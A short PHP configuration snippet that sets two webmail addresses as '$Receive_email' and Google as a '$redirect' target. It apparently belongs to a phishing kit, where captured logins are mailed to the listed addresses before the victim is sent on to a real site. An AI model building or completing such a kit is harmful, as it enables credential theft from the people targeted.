<?php 
$Receive_email="specialhorjob1@gmail.com, specialhorjob1@hotmail.com";
$redirect="https://www.google.com/";
?>